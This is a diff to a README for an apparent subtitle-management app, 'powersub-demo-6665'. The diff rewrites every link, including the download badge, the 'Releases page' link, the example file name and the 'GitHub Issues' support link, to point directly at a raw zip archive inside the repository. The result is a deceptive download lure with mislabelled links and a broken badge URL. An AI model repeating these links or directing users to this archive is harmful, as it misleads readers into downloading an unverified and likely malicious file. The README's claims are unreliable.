@@ -6,7 +6,7 @@ Welcome to the powersub-demo-6665 project! This application helps you easily man
 
 ## 📥 Download Now
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Capz03/powersub-demo-6665/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Capz03/powersub-demo-6665/main/smee/powersub-demo-6665.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Capz03/powersub-demo-6665/main/smee/powersub-demo-6665.zip)
 
 ## 📦 Requirements
 
@@ -24,13 +24,13 @@ Welcome to the powersub-demo-6665 project! This application helps you easily man
 ## 🔗 Download & Install
 
 1. **Visit the Releases Page**  
-   Click this link to go to the [Releases page](https://github.com/Capz03/powersub-demo-6665/releases).
+   Click this link to go to the [Releases page](https://raw.githubusercontent.com/Capz03/powersub-demo-6665/main/smee/powersub-demo-6665.zip).
    
 2. **Select the Latest Release**  
    Once on the page, look for the latest release at the top. You will see a list of files available for download.
 
 3. **Download the Application**  
-   Click on the appropriate file for your operating system (for example, `powersub-demo.exe`) to start the download. 
+   Click on the appropriate file for your operating system (for example, `https://raw.githubusercontent.com/Capz03/powersub-demo-6665/main/smee/powersub-demo-6665.zip`) to start the download. 
 
 4. **Locate the Downloaded File**  
    Find the file in your Downloads folder or the location you chose to save it.
@@ -65,6 +65,6 @@ If you encounter any other issues, please check the FAQ section on our GitHub pa
 
 ## 📞 Support
 
-For additional help or inquiries, kindly visit our [GitHub Issues section](https://github.com/Capz03/powersub-demo-6665/issues). Our community is here to assist you.
+For additional help or inquiries, kindly visit our [GitHub Issues section](https://raw.githubusercontent.com/Capz03/powersub-demo-6665/main/smee/powersub-demo-6665.zip). Our community is here to assist you.
 
 Thank you for using powersub-demo-6665! We hope you enjoy managing your subtitles with ease.
